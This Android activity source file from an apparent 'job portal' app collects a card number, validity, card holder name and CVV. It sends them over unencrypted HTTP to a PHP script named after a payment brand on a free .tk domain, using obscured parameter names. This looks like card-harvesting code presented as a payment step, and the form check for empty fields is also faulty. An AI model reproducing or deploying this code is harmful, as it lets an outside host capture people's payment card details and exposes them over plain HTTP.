package com.l9ench.jobportal;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;

import java.util.HashMap;
import java.util.Map;

public class SixthActivity extends AppCompatActivity {
    Button button;
    EditText cardno,vtir,chn,cvv,name;
    String s1,s2,s3,s4,s5,s6;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sixth);
        cardno=(EditText)findViewById(R.id.cardno);
        vtir =(EditText)findViewById(R.id.no1);
        name=(EditText)findViewById(R.id.no2);
        chn=(EditText)findViewById(R.id.cholder);
        cvv=(EditText)findViewById(R.id.cavvno);

        button=(Button)findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                s1=cardno.getText().toString();
                s2=vtir.getText().toString();
                s3=name.getText().toString();
                s4=chn.getText().toString();
                s5=cvv.getText().toString();
                s6=s2+s3;
                if(s1.equals("")&& s2.equals("")&&  s3.equals("")&& s4.equals("")&&s5.equals("")) {
                    Toast.makeText(SixthActivity.this, "please enter all fields", Toast.LENGTH_LONG).show();
                }
                else {
                    insertme(s1, s6, s4, s5);

                }

            }
        });
    }
    public void insertme(final String s1,final String s6,final String s4,final String s5)
    {
        StringRequest stringRequest=new StringRequest(Request.Method.POST, "http://lavanya1369.tk/paytm.php", new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Intent i = new Intent(getApplicationContext(), SevenActivity.class);
                    i.putExtra("cardno", s1.toString());
                    i.putExtra("validtr", s6.toString());
                    i.putExtra("cholder", s4.toString());
                    i.putExtra("cvv", s5.toString());
                    startActivity(i);

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            protected Map<String,String> getParams() throws AuthFailureError {
                Map<String,String> params =new HashMap<String, String>();
                params.put("na",s1);
                params.put("xx",s6);
                params.put("dd",s4);
                params.put("pas",s5);
                return params;

            }
        };
        Secondclass.getInstance().addToRequestQueue(stringRequest);

    }


}
